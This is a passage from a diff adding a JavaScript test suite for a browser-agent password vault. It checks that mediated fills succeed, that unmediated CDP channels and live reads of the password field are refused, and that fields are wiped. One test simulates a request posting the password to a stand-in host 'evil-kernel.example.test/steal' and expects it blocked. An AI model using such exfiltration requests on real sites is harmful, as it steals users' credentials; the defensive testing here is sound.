+        const rEphFill = await jbtPost(JBT_EPH, '/api/agent/browser/fill-vault', { target: '#pw', spec: 'jbtr30.example.test#alice/password' });
+        // 2) Owner pins external raw-CDP profile -> refused `login_channel_unmediated`
+        const rExtPrep = await jbtPost(JBT_EXT, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
+        const rExtFill = await jbtPost(JBT_EXT, '/api/agent/browser/fill-vault', { target: '#pw', spec: 'jbtr30.example.test#alice/password' });
+        const insertsBeforeLoc = fk.calls().filter((c) => c.seq > m0 && c.method === 'Input.insertText').length;
+
+        // 3) Owner pins local mediated named profile -> `prepare` + `/resolve` + `fill-vault` admitted (200), then read blocked (409 login_fill_live)!
+        const rLocPrep = await jbtPost(JBT_LOC, '/api/agent/browser/fill-vault', { prepare: true, target: '#pw', spec: 'jbtr30.example.test#alice/password' });
+        const rLocRes = await jbtPost(JBT_LOC, '/api/agent/browser/resolve', {
+          wrapper: true,
+          argv: ['fill', '#pw', '--vault', 'jbtr30.example.test#alice/password'],
+          fillTicket: rLocPrep.json?.fillTicket,
+        });
+        await dialogs.arm(profLoc.id);
+        const jobHandleLoc = keeper.findJobHandle({ ownerKey: KEY_LOC, jobId: 'job-loc' });
+        dialogs.bindTab?.({ profileId: profLoc.id, browserKey: jobHandleLoc }, tid);
+        dialogs.noteActiveTab?.({ profileId: profLoc.id, browserKey: jobHandleLoc }, tid);
+        const rLocFill = await jbtPost(JBT_LOC, '/api/agent/browser/fill-vault', {
+          profile: profLoc.id,
+          target: '#pw',
+          spec: 'jbtr30.example.test#alice/password',
+          targetId: tid,
+        });
+        const rLocReadWhileLive = await jbtPost(JBT_LOC, '/api/agent/browser/resolve', {
+          profile: profLoc.id,
+          wrapper: true,
+          fenceCheckOnly: true,
+          argv: ['get', 'value', '#pw'],
+          targetId: tid,
+        });
+
+        ok(
+          rEphPrep.status === 409 && rEphPrep.json?.code === 'job_no_profile'
+            && rEphFill.status === 409 && rEphFill.json?.code === 'job_no_profile'
+            && rExtPrep.status === 409 && rExtPrep.json?.code === 'login_channel_unmediated'
+            && rExtFill.status === 409 && rExtFill.json?.code === 'login_channel_unmediated'
+            && insertsBeforeLoc === 0
+            && rLocPrep.status === 200 && rLocRes.status === 200 && rLocFill.status === 200
+            && fk.readDomValues(tid).pw === PW
+            && rLocReadWhileLive.status === 409 && rLocReadWhileLive.json?.code === 'login_fill_live',
+          'R30-X2 (Extra scene 2 — job token jbt_ channel path): jbt_ refuses job_no_profile without pin and 409 login_channel_unmediated on external raw CDP (0 inserts), while local named pin admits jbt_ fill (200) and fences jbt_ reads (409 login_fill_live)',
+          { rEphPrep, rEphFill, rExtPrep, rExtFill, insertsBeforeLoc, rLocPrep, rLocFill, rLocReadWhileLive },
+        );
+      } finally {
+        srv.close();
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        dialogs.shutdown();
+        for (const p of keeper.list().profiles) await keeper.stop(p.id).catch(() => {});
+        keeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await relay.close();
+        await fk.close();
+      }
+    }
+
+    // ──────────────────────────────────────────────────────────────────────────
+    // R30-X3: Extra Scene 3 — `fake-kernel.mjs` custom-kernel mode (`mode: { standard: false }`)
+    // ──────────────────────────────────────────────────────────────────────────
+    {
+      const ORIGIN = 'https://kernelr30.example.test';
+      const PW = 'CustomKernelMode!2026';
+      const dataDir = path.join(tmpRoot, 'd-r30-x3');
+      const homeDir = path.join(tmpRoot, 'h-r30-x3');
+      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
+      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
+      let clock = 1_765_800_000_000;
+
+      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: false, omitFilledPassword: true } });
+      const tid = fk.targets()[0].targetId;
+      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+      const med = CM.create({ log: quiet });
+      await med.listen();
+      const rawWs = await openCdpClient(WebSocket, fk.wsUrl);
+
+      const KEY = 'bk-000033ca';
+      const SID = 'sess-r30-x3';
+      const TOKEN = 'vsst_r30_x3_' + crypto.randomBytes(8).toString('hex');
+
+      const keeper = BK.create({ dataDir, homeDir, env: () => ({ HOME: homeDir }), liveKeys: () => new Set([KEY]), log: quiet, now: () => clock, install: false, mediator: med });
+      const prof = keeper.createProfile({ label: 'R30KernelProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
+      const PID = prof.id;
+      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: fk.wsUrl, targetIds: [tid], mode: 'scope' });
+
+      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
+      await vault.setup('r30-x3-pw');
+      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
+      const logins = Lm.create({ vault, grants: () => grants, now: () => clock, log: quiet.log });
+      logins.addOwn({ origin: ORIGIN, username: 'alice', password: PW }, { who: 'owner' });
+      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });
+
+      const keeperWrap = {
+        ...keeper,
+        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: fk.wsUrl } : { ok: false }),
+        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
+        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
+        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
+        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
+        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
+      };
+      const dialogs = Dm.create({
+        keeper: keeperWrap,
+        logins,
+        now: () => clock,
+        liveFillMaxMs: 250,
+        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
+        leaseCountOf: () => 1,
+        conversationOf: () => ({ cid: 'conv-r30-x3', name: 'Kernel Agent' }),
+        log: quiet,
+      });
+      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Kernel Agent', cwd: tmpRoot, backendSessionId: 'conv-r30-x3' }]]);
+      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
+      const app = express();
+      app.use(express.json());
+      app.use(Rm.router);
+      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
+      try {
+        const armed = await dialogs.arm(PID);
+        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
+        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);
+        const kernelDetected = fk.calls().some((c) => c.method === 'VibeSpace.getVersion') && Boolean(dialogs.kernelFactOf(PID));
+
+        const base = `http://127.0.0.1:${srv.address().port}`;
+        const post = async (u, body) => {
+          const r = await fetch(base + u, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
+            body: JSON.stringify(body),
+          });
+          return { status: r.status, json: await r.json() };
+        };
+
+        const fillRes = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'kernelr30.example.test#alice/password', targetId: tid });
+        const domFilled = fk.readDomValues(tid).pw;
+        const readLive = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
+        const medWs = await openCdpClient(WebSocket, grant.url);
+        const attMed = await medWs.call('Target.attachToTarget', { targetId: tid, flatten: true });
+        const medEvalLive = await medWs.call('Runtime.evaluate', { expression: 'document.querySelector("#pw").value', returnByValue: true }, attMed.result?.sessionId);
+        const exfil = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-kernel.example.test/steal', postData: `pw=${encodeURIComponent(PW)}`, resourceType: 'Fetch' });
+
+        clock += 600;
+        await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
+        await sleep(90);
+        const domWiped = fk.readDomValues(tid).pw;
+
+        // Post-lift refill + read #1 wipe + read #2 lift in custom-kernel mode
+        await rawWs.evalOnTarget(tid, `(() => { document.querySelector('#pw').value = ${JSON.stringify(PW)}; return 1; })()`);
+        const refill1 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
+        const refill2 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
+        medWs.close();
+
+        ok(
+          armed.ok === true && kernelDetected
+            && fillRes.status === 200 && domFilled === PW
+            && readLive.status === 409 && readLive.json?.code === 'login_fill_live'
+            && Boolean(medEvalLive.error && /login_fill_live/.test(medEvalLive.error.message || ''))
+            && exfil.action === 'fail' && exfil.errorReason === 'BlockedByClient'
+            && domWiped === ''
+            && refill1.status === 409 && refill1.json?.code === 'login_fill_live'
+            && refill2.status === 200,
+          'R30-X3 (Extra scene 3 — custom-kernel mode standard:false): VibeSpace.getVersion activates kernel watch mode, mediated fill-vault types secret, blocks live reads + cross-origin exfil, wipes at ceiling, and catches/lifts post-lift refills',
+          { kernelDetected, fillRes, readLive, medEvalLive, exfil, domWiped, refill1, refill2 },
+        );
+      } finally {
+        rawWs.close();
+        srv.close();
+        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
+        dialogs.shutdown();
+        keeper.shutdown();
+        vault.close();
+        await med.shutdown();
+        await fk.close();
+      }
+    }
+  } finally {
+    fs.rmSync(tmpRoot, { recursive: true, force: true });
+  }
+}
+
+if (process.argv[1] && path.resolve(process.argv[1]) === path.resolve(SELF_PATH)) {
+  const repoArg = process.argv.find((a) => a.startsWith('--repo='));
+  const repoDir = repoArg ? path.resolve(repoArg.slice('--repo='.length)) : path.resolve(path.dirname(SELF_PATH), '../..');
+  let pass = 0, fail = 0;
+  const okCli = (c, label, detail) => {
+    if (c) {
+      pass++;
+      console.log(`[PASS] ${label}`);
+    } else {
+      fail++;
+      console.log(`[FAIL] ${label}${detail !== undefined ? ' -> ' + JSON.stringify(detail).slice(0, 4000) : ''}`);
+    }
+    return !!c;
+  };
+  await runR30LoginNails({ repoDir, ok: okCli });
+  console.log(`=== R30 NAILS SUMMARY: ${pass}/${pass + fail} passed, ${fail} failed ===`);
+  process.exit(fail ? 1 : 0);
+}
